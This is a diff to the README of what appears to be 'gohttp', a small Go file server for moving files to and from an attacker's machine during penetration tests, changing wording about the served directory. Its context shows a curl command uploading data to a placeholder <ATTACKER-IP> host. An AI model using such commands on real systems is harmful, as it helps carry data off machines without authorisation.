@@ -18,7 +18,7 @@ go run main.go
 ```
 
 ## Usage
-All the files that should be served must go into the **./static** folder.
+All the files that should be served must be inside the directory where `gohttp` is executed.
 
 ###  Download a file from your attack device:
 ```bash
@@ -44,7 +44,7 @@ curl -H "filename: test.txt" --data "this is raw data" http://<ATTACKER-IP>/
 
 ### Authentication
 If you are scared that somebody else in your network 
-either get's access to your files in **/static** or uploads
+either get's access to your files or uploads random
 files without your permission set:
 ```bash
 export AUTH=API-KEY
